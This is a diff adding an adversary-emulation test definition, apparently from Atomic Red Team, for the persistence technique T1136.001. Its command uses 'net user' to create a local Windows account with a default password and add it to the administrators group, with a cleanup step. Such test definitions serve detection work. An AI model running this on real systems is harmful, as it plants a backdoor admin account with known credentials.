@@ -1,0 +1,36 @@
+{
+    "name": "Create a new Windows admin user",
+    "description": "Creates a new admin user in a command prompt. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n",
+        "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1136.001",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Local Account",
+    "source": "ART",
+    "uuid": "fda74566-a604-4581-a4cc-fbbe21d66559",
+    "arguments": {
+        "username": {
+            "description": "Username of the user to create",
+            "type": "string",
+            "default": "T1136.001_Admin"
+        },
+        "password": {
+            "description": "Password of the user to create",
+            "type": "string",
+            "default": "T1136_pass"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
